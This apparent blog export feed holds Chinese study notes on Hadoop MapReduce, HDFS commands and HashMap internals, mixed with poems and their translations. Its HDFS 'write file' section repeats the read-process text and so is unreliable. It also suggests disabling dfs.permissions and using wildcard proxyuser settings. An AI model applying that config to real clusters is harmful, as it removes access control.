并行度是大约每个节点 20-100 个 map，最好 每个 map 的执行时间至少一分钟。 如果 job 的每个 map 或者 reduce task 的运行时间都只有 30-40 秒钟，那么就减少该 job 的 map 或者 reduce 数，每一个 task(map|reduce)的 setup 和加入到调度器中进行调度，这个 中间的过程可能都要花费几秒钟，所以如果每个 task 都非常快就跑完了，就会在 task 的开 始和结束的时候浪费太多的时间。 配置 task 的 JVM 重用可以改善该问题： mapred.job.reuse.jvm.num.tasks，默认是 1，表示一个 JVM 上最多可以顺序执行的 task 数目（属于同一个 Job）是 1。也就是说一个 task 启一个 JVM。 这个值可以在 mapred-site.xml 中进行更改，当设置成多个，就意味着这多个 task 运行在同一个 JVM 上，但不是同时执行， 是排队顺序执行 如果 input 的文件非常的大，比如 1TB，可以考虑将 hdfs 上的每个 blocksize 设大，比如 设成 256MB 或者 512MB 2.6、ReduceTask 并行度决定机制reducetask 的并行度同样影响整个 job 的执行并发度和执行效率，但与 maptask 的并发数由 切片数决定不同，Reducetask 数量的决定是可以直接手动设置： 12// 设置 ReduceTask 的并行度job.setNumReduceTasks(4); 默认值是 1， 手动设置为 4，表示运行 4 个 reduceTask， 设置为 0，表示不运行 reduceTask 任务，也就是没有 reducer 阶段，只有 mapper 阶段 如果数据分布不均匀，就有可能在 reduce 阶段产生数据倾斜 注意：reducetask 数量并不是任意设置，还要考虑业务逻辑需求，有些情况下，需要计算全局汇总结果，就只能有 1 个 reducetask 尽量不要运行太多的 reducetask。对大多数 job 来说，最好 rduce 的个数最多和集群中的 reduce 持平，或者比集群的 reduce slots 小。这个对于小集群而言，尤其重要。 最好的ReduceTask 个数是：datanode 个数 * 0.75~0.95 左右 2.7 客户端提交 MR 程序 Job 的流程 3. 昨日复习1.MapReduce 的 wc 编程 手写代码 Mapper Reducer Driver 2.MapTask 的并行度 在程序执行的时候运行的 maptask 的总个数 3.ReduceTask的并行度问题 ReduceTask 的并行度设置依赖于自己传入的参数 一般经验： ReduceTask 的个数应该 = datanode 的阶段数 * （0.75~0.95） ReduceTask 在设置的时候的并行度有一定的瓶颈 分区： 决定 ReduceTask 中的数据怎么分配的 默认分区方式 自定义分区]]></content>
      <categories>
        <category>Hadoop</category>
        <category>MapReduce</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Hadoop</tag>
        <tag>MapReduce</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[▍Do Not Go Gentle into That Good Night]]></title>
    <url>%2F2018%2F06%2F04%2FPoetry%2F%E4%B8%8D%E8%A6%81%E6%B8%A9%E5%92%8C%E7%9A%84%E8%B5%B0%E8%BF%9B%E9%82%A3%E4%B8%AA%E8%89%AF%E5%A4%9C%2F</url>
    <content type="text"><![CDATA[Do not go gentle into that good night, Old age should burn and rave at close of the day; Rage, rage against the dying of the light. Though wise men at their end know dark is right, Because their words had forked no lightning they Do not go gentle into that good night. Good men, the last wave by, crying how bright Their frail deeds might have danced in a green bay, Rage, rage against the dying of the light. Wild men, who caught and sang the sun in flight, And learn, too late, they grieved it on its way, Do not go gentle into that good night. Grave men, near death, who see with blinding sight Blind eyes could blaze like meteors and be gay, Rage, rage against the dying of the light. And you, my father, there on the sad height, Curse, bless, me now with your fierce tears, I pray. Do not go gentle into that good night. Rage, rage against the dying of the light. 《不要温和地走进那个良夜》 -巫宁坤译本 ​ 不要温和地走进那个良夜， 老年应当在日暮时燃烧咆哮； 怒斥，怒斥光明的消逝。 虽然智慧的人临终时懂得黑暗有理， 因为他们的话没有进发出闪电，他们 也并不温和地走进那个良夜。 善良的人，当最后一浪过去，高呼他们脆弱的善行 可能曾会多么光辉地在绿色的海湾里舞蹈， 怒斥，怒斥光明的消逝。 狂暴的人抓住并歌唱过翱翔的太阳， 懂得，但为时太晚，他们使太阳在途中悲伤， 也并不温和地走进那个良夜。 严肃的人，接近死亡，用炫目的视觉看出 失明的跟睛可以像流星一样闪耀欢欣， 怒斥，恕斥光明的消逝。 您啊，我的父亲，在那悲哀的高处。 现在用您的热泪诅咒我，祝福我吧。我求您 不要温和地走进那个良夜。 怒斥，怒斥光明的消逝 《不要温顺地走入那长夜》 -和菜头译本 白日将尽，暮年仍应燃烧咆哮 狂怒吧，狂怒吧！ 对抗着光明渐逝 虽然智者深知 人之将死，黑暗自有其时 只因他们所言未曾裂天如电 他们不要温顺地走入那长夜 随着最后一浪，善人在哭喊 哭喊那脆弱的善行 它本应何其欢快 在绿色峡湾里起舞 狂怒吧，狂怒吧！ 对抗着光明渐逝。 狂人曾抓住飞驰的太阳 放声歌唱 太晚，他们才感到其中的伤感 不要温顺地走进那长夜 严肃的人行将死去时 用那渐渐失神的目光去看 盲瞳却如流星璀璨，欢欣溢满 狂怒吧，狂怒吧！ 对抗着光明渐逝 还有你啊，我的父亲，远在悲伤的高地 我恳请你现在 就让你诅咒，你的祝福 随着热泪落下 不要温顺地走进那长夜 狂怒吧，狂怒吧！ 对抗这光明渐逝 ​ 《 绝不向黑夜请安》 -高晓松译本 绝不向黑夜请安 老朽请于白日尽头涅槃 咆哮于光之消散 先哲虽败于幽暗 诗歌终不能将苍穹点燃 绝不向黑夜请安 贤者舞蹈于碧湾 为惊涛淹没的善行哭喊 咆哮于光之消散 狂者如夸父逐日 高歌中顿觉迟来的伤感 绝不向黑夜请安 逝者于临终迷幻 盲瞳怒放出流星的灿烂 咆哮于光之消散 那么您，我垂垂将死的父亲 请掬最后一捧热泪降临 请诅咒，请保佑 我祈愿，绝不向 黑夜请安，咆哮 于光之消散]]></content>
      <categories>
        <category>文艺</category>
        <category>诗歌</category>
      </categories>
      <tags>
        <tag>诗歌</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hadoop学习笔记-3 HDFS 原理剖析]]></title>
    <url>%2F2018%2F06%2F03%2FHadoop%2F1-HDFS%2FHDFS-2-%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90%2F</url>
    <content type="text"><![CDATA[1. HDFS体系结构主从。。。 2.NameNode概念 [x] 是整个文件系统的管理节点。它维护着整个文件系统的文件目录树，文件/目录的元信息和每个文件对应的数据块列表。接收用户的操作请求。 [x] 在hdfs-site.xml中的dfs.namenode.name.dir属性 [x] 文件包括： [x] 文件包括: ①fsimage:元数据镜像文件。存储某一时段NameNode内存元数据信息。 ②edits:操作日志文件。 ③fstime:保存最近一次checkpoint的时间 以上这些文件是保存在linux的文件系统中。 查看 fsimage 和 edits的内容 查看 NameNode中 fsimage 的内容 查看 fsimage镜像文件内容Usage: bin/hdfs oiv [OPTIONS] -i INPUTFILE -o OUTPUTFILE 1234567891011121314# 可以知道数据存在那个哪个 fsimage 镜像中------------------------------------# 使用离线的查看器 输出到网页查看oiv -i hadoopdata/namenode/current/fsimage_0000000000000000250 -o 0000000000000000250# 出现这样的提示INFO offlineImageViewer.WebImageViewer: WebImageViewer started. Listening on /127.0.0.1:5978. Press Ctrl+C to stop the viewer.# 另起一个窗口查看hadoop fs -ls -R webhdfs://127.0.0.1:5978------------------------------------# 也可以导出到 xml 文件bin/hdfs oiv -p XML -i tmp/dfs/name/current/fsimage_0000000000000000055 -o fsimage.xml 查看edits文件， 也可以导出到 xml 12# 查看edtis内容bin/hdfs oev -i tmp/dfs/name/current/edits_0000000000000000057-0000000000000000186 -o edits.xml 3. Datanode提供真实文件数据的存储服务 Datanode 节点的数据切块存储位置 ~/hadoopdata/datanode/current/BP-1070660005-192.168.170.131-1527865615372/current/finalized/subdir0/subdir0 12345678[ap@cs2]~/hadoopdata/datanode/current/BP-1070660005-192.168.170.131-1527865615372/current/finalized/subdir0/subdir0% ll总用量 213340-rw-r--r-- 1 ap ap 134217728 6月 2 13:35 blk_1073741842-rw-r--r-- 1 ap ap 1048583 6月 2 13:35 blk_1073741842_1018.meta-rw-r--r-- 1 ap ap 82527955 6月 2 13:35 blk_1073741843-rw-r--r-- 1 ap ap 644759 6月 2 13:35 blk_1073741843_1019.meta-rw-r--r-- 1 ap ap 13 6月 3 02:12 blk_1073741850-rw-r--r-- 1 ap ap 11 6月 3 02:12 blk_1073741850_1028.meta 文件块（block）：最基本的存储单位。对于文件内容而言，一个文件的长度大小是size，那么从文件的０偏移开始，按照固定的大小，顺序对文件进行划分并编号，划分好的每一个块称一个Block。HDFS默认Block大小是128MB，以一个256MB文件，共有256/128=2个Block. 不同于普通文件系统的是，HDFS中，如果一个文件小于一个数据块的大小，并不占用整个数据块存储空间, 按文件大小的实际容量存储 Replication。多复本。默认是三个。 hdfs-site.xml的dfs.replication属性 手动设置某个文件的副本数为3个 bin/hdfs dfs -setrep 3 /a.txt 4. 数据存储： 写文件解析 [x] 疑点： HDFS client上传数据到HDFS时，会首先在本地缓存数据，当数据达到一个block大小时，请求NameNode分配一个block。NameNode会把block所在的DataNode的地址告诉HDFS client。HDFS client会直接和DataNode通信，把数据写到DataNode节点一个block文件中。 问题： 如果一直写的数据都没有达到一个 block 大小， 那怎么存储？？ 写文件的过程： 首先调用FileSystem对象的open方法，其实是一个DistributedFileSystem的实例 DistributedFileSystem通过rpc获得文件的第一批个block的locations，同一block按照重复数会返回多个locations，这些locations按照hadoop拓扑结构排序，距离客户端近的排在前面. 前两步会返回一个FSDataInputStream对象，该对象会被封装成DFSInputStream对象，DFSInputStream可以方便的管理datanode和namenode数据流。客户端调用read方法，DFSInputStream最会找出离客户端最近的datanode并连接。 数据从datanode源源不断的流向客户端。 如果第一块的数据读完了，就会关闭指向第一块的datanode连接，接着读取下一块。这些操作对客户端来说是透明的，客户端的角度看来只是读一个持续不断的流。 如果第一批block都读完了，DFSInputStream就会去namenode拿下一批blocks的location，然后继续读，如果所有的块都读完，这时就会关闭掉所有的流。 如果在读数据的时候，DFSInputStream和datanode的通讯发生异常，就会尝试正在读的block的排第二近的datanode,并且会记录哪个datanode发生错误，剩余的blocks读的时候就会直接跳过该datanode。DFSInputStream也会检查block数据校验和，如果发现一个坏的block,就会先报告到namenode节点，然后DFSInputStream在其他的datanode上读该block的镜像 该设计的方向就是客户端直接连接datanode来检索数据并且namenode来负责为每一个block提供最优的datanode，namenode仅仅处理block location的请求，这些信息都加载在namenode的内存中，hdfs通过datanode集群可以承受大量客户端的并发访问。 5. 数据存储： 读文件解析 读文件的过程 首先调用FileSystem对象的open方法，其实是一个DistributedFileSystem的实例 DistributedFileSystem通过rpc获得文件的第一批个block的locations，同一block按照重复数会返回多个locations，这些locations按照hadoop拓扑结构排序，距离客户端近的排在前面. 前两步会返回一个FSDataInputStream对象，该对象会被封装成DFSInputStream对象，DFSInputStream可以方便的管理datanode和namenode数据流。客户端调用read方法，DFSInputStream最会找出离客户端最近的datanode并连接。 数据从datanode源源不断的流向客户端。 如果第一块的数据读完了，就会关闭指向第一块的datanode连接，接着读取下一块。这些操作对客户端来说是透明的，客户端的角度看来只是读一个持续不断的流。 如果第一批block都读完了，DFSInputStream就会去namenode拿下一批blocks的location，然后继续读，如果所有的块都读完，这时就会关闭掉所有的流。 如果在读数据的时候，DFSInputStream和datanode的通讯发生异常，就会尝试正在读的block的排第二近的datanode,并且会记录哪个datanode发生错误，剩余的blocks读的时候就会直接跳过该datanode。DFSInputStream也会检查block数据校验和，如果发现一个坏的block,就会先报告到namenode节点，然后DFSInputStream在其他的datanode上读该block的镜像 该设计的方向就是客户端直接连接datanode来检索数据并且namenode来负责为每一个block提供最优的datanode，namenode仅仅处理block location的请求，这些信息都加载在namenode的内存中，hdfs通过datanode集群可以承受大量客户端的并发访问。 6.Hadoop Archives （HAR files）Hadoop Archives (HAR files)是在0.18.0版本中引入的，它的出现就是为了缓解大量小文件消耗namenode内存的问题。HAR文件是通过在HDFS上构建一个层次化的文件系统来工作。一个HAR文件是通过hadoop的archive命令来创建，而这个命令实 际上也是运行了一个MapReduce任务来将小文件打包成HAR。对于client端来说，使用HAR文件没有任何影响。所有的原始文件都 （using har://URL）。但在HDFS端它内部的文件数减少了。 通过HAR来读取一个文件并不会比直接从HDFS中读取文件高效，而且实际上可能还会稍微低效一点，因为对每一个HAR文件的访问都需要完成两层 index文件的读取和文件本身数据的读取。并且尽管HAR文件可以被用来作为MapReduce job的input，但是并没有特殊的方法来使maps将HAR文件中打包的文件当作一个HDFS文件处理。 打包出来的 har 文件在xxx.har/part-0 中， contentz-size 跟原来的文件总大小一样 创建文件 hadoop archive -archiveName xxx.har -p /src /dest查看内容 hadoop fs -lsr har:///dest/xxx.har 可以原封不动的显示出来 123456789101112131415# 打包成 harhadoop archive -archiveName test.har -p /user/test /# 查看har 文件[ap@cs1]~% hadoop fs -count /test.har/part-0 0(目录数) 1(文件数) 72(文件大小) /test.har/part-0 (文件名)# 查看打包前文件[ap@cs1]~% hadoop fs -count /user/test 1 2 72 /user/test # 查看 har 文件， 把打包前的原本文件都显示出来了[ap@cs1]~% hadoop fs -ls -R har:///test.har-rw-r--r-- 3 ap supergroup 50 2018-06-03 04:24 har:///test.har/a.txt-rw-r--r-- 3 ap supergroup 22 2018-06-03 04:24 har:///test.har/b.txt 注意点： 存储层面：为了解决小文件过多导致的 Namenode 压力过大问题， 把很多小文件打包成一个 har 文件。 使用层面： 但是实际处理的时候， 还是会还原出原本的小文件进行处理， 不会把 har 文件当成一个 HDFS 文件处理。 HDFS 上不支持 tar， 只支持 har打包 7.HDFS 的 HA]]></content>
      <categories>
        <category>Hadoop</category>
        <category>HDFS</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Hadoop</tag>
        <tag>HDFS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[▍回答]]></title>
    <url>%2F2018%2F06%2F03%2FPoetry%2F%E5%9B%9E%E7%AD%94%2F</url>
    <content type="text"><![CDATA[卑鄙是卑鄙者的通行证，高尚是高尚者的墓志铭，看吧，在那镀金的天空中，飘满了死者弯曲的倒影。 冰川纪过去了，为什么到处都是冰凌？好望角发现了，为什么死海里千帆相竞？ 我来到这个世界上，只带着纸、绳索和身影，为了在审判之前，宣读那些被判决的声音。 告诉你吧，世界我–不–相–信！纵使你脚下有一千名挑战者，那就把我算作第一千零一名。 我不相信天是蓝的，我不相信雷的回声，我不相信梦是假的，我不相信死无报应。 如果海洋注定要决堤，就让所有的苦水都注入我心中，如果陆地注定要上升，就让人类重新选择生存的峰顶。 新的转机和闪闪星斗，正在缀满没有遮拦的天空。那是五千年的象形文字，那是未来人们凝视的眼睛。 作者 / 北岛]]></content>
      <categories>
        <category>文艺</category>
        <category>诗歌</category>
      </categories>
      <tags>
        <tag>诗歌</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hadoop学习笔记-2 HDFS基础入门]]></title>
    <url>%2F2018%2F06%2F02%2FHadoop%2F1-HDFS%2FHDFS-1-%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[Hadoop的核心组件 之 HDFSHDFS1. HDFS是什么: 分布式文件系统 2. HDFS 设计思想 分而治之, 切分存储, 当一个文件过大的时候, 一个节点存储不了, 采用切分存储 分块存储: 每一个块叫做 block 如果一个8T的数据, 这个怎么分合适??? 设置分块的时候要考虑一个事情 : 负载均衡 块的大小不能太大, 太大会造成负载不均衡 hadoop2.x 中默认的切分的块的大小是: 128M, 1.x中默认的是64M 如果一个文件不足128M, 也会单独存一个快, 快的大小就是存储数据的实际大小 这个分块存储思想中, 如果一个块的存储节点宕机了, 这个时候, 数据的安全性得不到保证了 HDFS中默认块的存储采用备份机制 默认的备份个数是3个(总共存的, 存到datanode上的, namenode不存), 之前自己配的是2个, 所有备份相同地位是相同的. 相同的数据块的备份一定存储在不同的节点上 如果节点总共2个, dfs.replication=3 副本个数是3个, 实际存储2个, 另一个进行记账, 当集群节点个数大于3个时, 会复制这个副本, 最终达到3个 假设集群中的节点4个, 副本3个, 有一个副本的机器宕机了, 这个时候发现副本的个数 小于 设定的个数, 就会进行复制, 达到3个副本, 如果 这个时候, 刚才宕机的节点又恢复了, 这个时候集群副本个数为4了, 集群会等待一段时间, 如果发现还是4个, 就会删除一个副本, 达到3个(设定值) 备份越多越好吗? 理论上副本数越多, 数据安全性越高 但是副本数越多, 会占用过多的存储资源, 会造成集群的维护变得越困难 100 个节点, 50个副本, 在这50个副本中, 随时都有可能宕机, hdfs就需要维护副本 一般情况下, 3个就可以了 hadoop是基于廉价的pc机设计的, 会造成机器随时可能宕机 HDFS的目录结构 hdfs的目录结构与linux 操作系统类似, 以 /为跟节点, 我们将这个目录🌲称为抽象目录树 因为hdfs的目录结构代表的是所有数据节点的抽象出来的目录, 不代表任何一个节点 hdfs: /hadoop.zip 500M 被分成4个块存储 hdfs中存储的数据块 是有编号的, blk_1, blk_2, blk_3, blk_4 /spark.zip 300M 3个块, blk_5 blk_6 blk_7 底层存储的时候, 每一个block都有一个唯一的id hdfs的数据底层存储的时候吗, 还是存在真正的物理节点上. 2. HDFS 的整体结构主从结构: 一个主节点, 多个从节点 namenode: 用于存储元数据, 包括: 抽象目录树 存储数据和block的对应关系 block存储的位置 处理客户端的读写请求 读: 下载 写: 上传 datanode 负责真正的数据存储, 存储数据的block 真正处理读写 secondarynamenode: 冷备份节点: 助理 当namenode宕机的时候, secondarynamenode不能主动切换为 namenode, 但是 secondarynamenode中存储的数据与namenode相同. 主要作用: namenode宕机的时候, 帮助namenode恢复 帮助namenode做一些事情, 分担namenode的压力 3. HDFS优缺点: 优点: 可构建在廉价机器上, 成本低, 通过多副本提高可靠性, 提供了容错和恢复机制 高容错性 容错性: 数据访问上, 一个节点数据丢失, 不影响整体的数据访问 数据自动保存多个副本, 副本丢失后, 自动恢复, 最终恢复到用户配置的副本个数 适合批处理, 适合离线数据处理 移动计算而非数据, 数据位置暴露给计算框架 适合大数据处理 GB, TB 甚至 PB 级数据, 百万规模以上的文件数量, 10k+ 节点规模 流式文件访问, 不支持数据修改, hdfs用于数据存储 一次性写入, 多次读取, 保证数据一致性 缺点: 不支持低延迟的数据访问, 不支持 实时/近实时 数据访问, 因为涉及到多轮RPC调用 向 NameNode 寻址.. 拿到地址后， 向 DataNode 请求数据.. 不擅长存储大量的小文件–kb级别的 寻址时间可能大于读取数据的时间, 不划算 进行数据访问的时候先找元数据 元数据是和block对应的, 1个block块对应一条元数据 1000w个1kb的文件, 存了1000w个块 — 1000w元数据 在进行数据访问的时候可能花了 1s 的时间, 总体上不划算 这样会造成元数据存储量过大, 增加namenode的压力 在hdfs中一般情况下, 一条元数据大小 150byte 左右 1000w条元数据 — 1000w * 150, 1.5G左右 不支持文件内容修改, 仅仅支持文件末尾追加 append， 一个文件同时只能有一个写者，不支持并发操作 ==4. HDFS 的 常用命令:==HDFS归根结底就是一个文件系统, 类似于 linux, 需要用命令来操作 1. hapdoop fs 命令 hadoop fs / hdfs dfs 效果是一样的 在hadoop中查看, 只有绝对路径的访问方式 查看帮助 hadoop fs -help 查看所有 hadoop fs的帮助 hadoop fs -help ls 查看 fs下的 ls的帮助 列出根目录: hadoop fs -ls / hadoop fs -ls -R / 递归展示 hadoop fs -ls -R -h /友好展示， 展示文件大小单位 如果不指定目录， 会默认找当前用户xx对应的/user/xx的目录 递归创建 -mkdir -p: hadoop fs -mkdir -p /aa/bb/cc/dd 不加 -p 为普通创建 创建空文件-touchz 类似于 Linux 下的 touch 上传 put: [-put [-f][-p] [-l] &lt;localsrc&gt; ... &lt;dst&gt;] 上传一个: hadoop fs -put hadoop-2.7.6.tar.gz /ss 上传多个: hadoop fs -put aa.txt bb.txt /ss 下载 get hadoop fs -get hdfs路径 本地路径 合并下载 getmerge hadoop fs -getmerge /ss/aa.txt /ss/bb.txt /home/ap/cc.txt 会将最后一个路径之前8的当做需要合并的文件, 最后一个路径中指定的文件就是合并生成的文件 查看文件内容 cat -cat 查看文件内容 -text也是类似 删除文件 rm rm -rf (错误的) rm -r(递归) -f(强制) 文件hadoop fs -rm -f /ss/aa.txt 文件夹 hadoop fs -rm -f -r /aa mv 修改名字, 移动 移动的文件从 hdfs 到 hdfs hadoop fs -mv .. .. cp 复制 hadoop fs -cp /hdfsfile /hdfsfile: 从 hdfs 复制到 hdfs 参数 -p ： 复制后保持文件的原本属性, 时间戳， 权限等 Passing -p preserves status [topax] (timestamps, ownership, permission, ACLs, XAttr). 参数 -f : 已有同名文件的话， 直接覆盖 在末尾追加: -appendToFile 本地文件 hdfs文件` 将本地文件bb.txt 追加到 htfd的 /aa/aa.txt 上 hadoop fs -appendToFile aa.txt /ss/bb.txt 从命令行追加 , 但是不知道怎么结束， 先存疑？？ hadoop fs -appendToFile - /a.txt` 这个追加是在原始块的末尾追加的. 会改变集群上的文件 如果超过128M才会进行切分, 但这个命令一般不会使用 查看文件，文件夹数量 count DIR_COUNT FILE_COUNT CONTENT_SIZE FILE_NAME 8 3 176.5 K /tmp hadoop fs -count -h /tmp: -h 是友好展示 hdfs dfs -count -h /tmp: 与上面效果一样 hdfs dfs -count -q -h /tmp: 查看文件配额， 具体看 help du： 展示文件大小， 如果参数是文件夹， 则展示文件夹下文件的大小 hadoop fs -du -h /tmp hadoop fs -du -s -h /tmp: s 应该是 sum 的意思， 展示所有文件大小的总和 展示文件最后1kb内容-tail Show the last 1KB of the file. hadoop fs -tail /dd.txt` -f Shows appended data as the file grows. 应用场景： 监控日志 修改文件权限 chmod 12345678910111213141516# 1. 直接使用十进制数字修改 [ap@cs2]~/test% hadoop fs -ls /drwxr-xr-x - ap supergroup 0 2018-06-01 08:55 /aa# -R： /aa 目录下所有的文件递归修改权限[ap@cs2]~/test% hadoop fs -chmod -R 777 /aa[ap@cs2]~/test% hadoop fs -ls /drwxrwxrwx - ap supergroup 0 2018-06-01 08:55 /aa# 2. 针对用户组修改，注意，修改2个不同组权限， 用，隔开hadoop fs -chmod u+x,g+x /a.txt # 3. 最常用的文件权限， 是 644(-rw-r--r--) 和 755(-rwxr-xr-x) 文件创建默认就是644# 4. u+x 与 +x 的区别 前者指定加在哪组用户上， 后者是所有组都加 修改用户权限 chown 1hadoop fs -chown -R 用户名:组名 hdfs目录/文件 2. hdfs dfsadmin命令 管理员对当前节点的一些操作 hdfs dfsadmin -report 报告当前的一些状态 -live 活跃的 -dead 死的 -decommissioning 退役的 **hdfs dfsadmin -safemode 安全模式 系统刚启动的时候， 会有30秒的安全模式开启状态， 过了30秒就关了 enter 进入 leave 离开 get 查看 hdfs dfsadmin 设置配额 -setQuota ： 配额是限定的文件&amp;文件夹的数量 A quota of 1 would force the directory to remain empty. 空文件本身算一个文件 bin/hdfs dfsadmin -setQuota 10 lisi -clrQuota -setSpaceQuota： 空间配额限定的是大小 bin/hdfs dfsadmin -setSpaceQuota 4k /lisi/ -clrSpaceQuota hdfs dfs -count -q -h /user: 加上 -q 是查看配额 3. httpFS访问使用 REST 的形式， 可以在浏览器上直接访问集群， 可以在非 Linux 平台访问 123456789101112131415161718192021# 编辑文件httpfs-env.sh# 打开此句注释, 使用内嵌的 tomcatexport HTTPFS_HTTP_PORT=14000# 编辑文件core-site.xml&lt;property&gt; &lt;name&gt;hadoop.proxyuser.root.hosts&lt;/name&gt; &lt;value&gt;*&lt;/value&gt;&lt;/property&gt;&lt;property&gt; &lt;name&gt;hadoop.proxyuser.root.groups&lt;/name&gt; &lt;value&gt;*&lt;/value&gt;&lt;/property&gt;编辑文件hdfs-site.xml&lt;property&gt; &lt;name&gt;dfs.webhdfs.enabled&lt;/name&gt; &lt;value&gt;true&lt;/value&gt;&lt;/property&gt;重新启动namenode，执行 sbin/httpfs.sh start# 执行命令curl -i "http://cs1:14000/webhdfs/v1?user.name=root&amp;op=LISTSTATUS" 更多命令参考 相关知识点 这些命令在集群中的任何节点都可以做, hdfs文件系统中, 看到的目录结构只是一个抽象目录, 实际存储在集群中的节点上 aa.txt , 大小150M, hadoop fs -put aa.txt / 会在根目录下看到 /aa.txt, 但是 aa.txt 真实存储的时候, 会先进行分块, 分2块, 进行存储, 假设集群中5个存储节点, 这2个块存储在哪个节点, 由namenode进行分配 图形界面点进去, 可以看到存储的块 Linux的权限管理命令: 修改 文件/文件夹 权限的 chmod: 可读: r , =4 可写: w, =2 可执行: x, =1 最大权限是7 -rw-rw-r– 文件属性 d:目录 -:文件 l:链接 第一组: 本用户, 第二组: 本组用户, 第三组: 其它用户 chmod 711 改一个文件夹下所有文件权限为711 chmod -R 711 目录 修改文件所属用户和组 chown chown -R root:root ss/把ss的文件夹全部改成root用户和root组 5、Eclipse查看Hadoop文件信息详情可以查看 其中可能遇到的bug，参见 其中， Eclipse端无法直接删除文件的问题，似乎可以通过在hdfs-site.xml 中修改访问权限来实现， 还未尝试 1234&lt;property&gt; &lt;name&gt;dfs.permissions&lt;/name&gt; &lt;value&gt;false&lt;/value&gt; &lt;/property&gt; 6. 通过 Java API的方式操作 HDFS]]></content>
      <categories>
        <category>Hadoop</category>
        <category>HDFS</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Hadoop</tag>
        <tag>HDFS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HashMap的实现原理]]></title>
    <url>%2F2018%2F06%2F02%2FJava%2FMyStudy%2FHashMap%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[1.什么是HashMap Hash: 散列将一个任意的长度通过某种(hash函数)算法转换成一个固定值 Map: 地图, (x,y)存储 底层就是一个数组结构, 数组中的每一项又是一个链表, 当新建一个HashMap的时候, 就会初始化一个数组 总结: 通过 hash 出来值, 然后通过值定位到某个 map, 然后value 存储到这个 map中, value只不过是 key 的附属. 2.源码分析先给出结论数据结构: 底层是数组 Entry 就是数组中的元素 每个Map.Entry其实就是一个key-value对, 它持有一个指向下一个元素的引用Entry&lt;K,V&gt; next;, 这就构成了链表 存取实现: 存储put : 过程 先根据 key 的 hashCode 重新计算 hash 值, 根据 hash 值得到这个元素在数组中的位置(下标) 如果数组该位置上已经存放有其他元素了, 那么在这个位置上的元素将以链表的形式存放, 新加入的放在链头, 最先加入的放在链尾. 如果数组该位置上没有元素, 就直接将该元素放到数组中的该位置上. 注意点 当系统决定存储 HashMap 中的 key-value 对时，完全没有考虑 Entry 中的 value，仅仅只是根据 key来计算并决定每个Entry的存储位置。当系统决定了 key的存储位置之后，value随之保存在那里即可。 对于于任意给定的对象，只要它的 hashCode()返回值相同，那么程序调用 hash(int h)方法所计算得到的hash 码值总是相同的。 本质上就是把 hash 值对数组长度取模运算， 这样一来，元素的分布相对来说是比较均匀的 但是系统是用的位运算， 方法更巧妙， 消耗更小 读取get 过程 首先计算 key 的 hashCode，找到数组中对应位置的某一元素，然后通过key 的 equals 方法在对应位置的链表中找到需要的元素。 存储实现总结: HashMap 在底层将 key-value 当成一个整体进行处理，这个整体就是一个 Entry 对象。 HashMap 底层采用一个 Entry[] 数组来保存所有的 key- value 对，当需要存储一个 Entry 对象时，会根据 hash 算法来决定其在数组中的存储位置，在根据 equals 方法决定其在该数组位置上的链表中的存储位置； 当需要取出一个 Entry 时，也会根据 hash 算法找到其在数组中的存储位置，再根据 equals 方法从该位置上的链表中取出该 Entry。 3. HashMap 的性能参数123456789101112131415161718192021222324252627282930313233343536/** * 桶表默认容量 16, 必须是 2 的倍数， 便于后面的 位运算 * 控制hashcode 不超16范围, a.hashcode = xx % 16 (hashcode 取模 桶个数) */static final int DEFAULT_INITIAL_CAPACITY = 1 &lt;&lt; 4; // aka 16/** * MUST be a power of two &lt;= 1&lt;&lt;30. * 桶表最大 2^30 */static final int MAXIMUM_CAPACITY = 1 &lt;&lt; 30;/** * 扩容因子（负载因子）: 0.75 * 扩容: 每次2倍 */static final float DEFAULT_LOAD_FACTOR = 0.75f;/** * 链表: hash算法值相同的时候, 会把值相同的放在一个链表上, 链表上的元素个数 * 超过8个时, 链表转化为二叉树, 提升查询效率 */static final int TREEIFY_THRESHOLD = 8;/** * 小于6个， 又变回链表 */static final int UNTREEIFY_THRESHOLD = 6;/** * The smallest table capacity for which bins may be treeified. * (Otherwise the table is resized if too many nodes in a bin.) * Should be at least 4 * TREEIFY_THRESHOLD to avoid conflicts * between resizing and treeification thresholds. */static final int MIN_TREEIFY_CAPACITY = 64;]]></content>
      <categories>
        <category>Java</category>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[▍无题]]></title>
    <url>%2F2018%2F06%2F02%2FPoetry%2F%E6%97%A0%E9%A2%98%2F</url>
    <content type="text"><![CDATA[在淮海中路看油画，要把天空调弱 让油菜花暗下去，看眉式清秀之人离开身体 穿过街巷中涂抹过的人群，悄悄投了水。 在淮海中路1411号，春光遮蔽了暗疾 鸟鸣带来逼仄和飞行感，一个人的身体像麻绳 裸露在新鲜空气中，骨头开裂出花朵。 眼底的云又白又黑，膝盖的青色愈爱愈深 穿过死后潭水的寂静，背部长出的鱼鳞 一年比一年薄，月亮一日比一日旧。 与春风交换身体，与素不相识之人抱头痛哭 与我，许下再死一次的诺言，这么多年了 她说，我爱你依旧，胜过画中人。 作者 / 隐居的事]]></content>
      <categories>
        <category>文艺</category>
        <category>诗歌</category>
      </categories>
      <tags>
        <tag>诗歌</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hadoop相关书籍]]></title>
    <url>%2F2018%2F06%2F02%2FHadoop%2F0-Hadoop%2FHadoop%E7%9B%B8%E5%85%B3%E4%B9%A6%E7%B1%8D%2F</url>
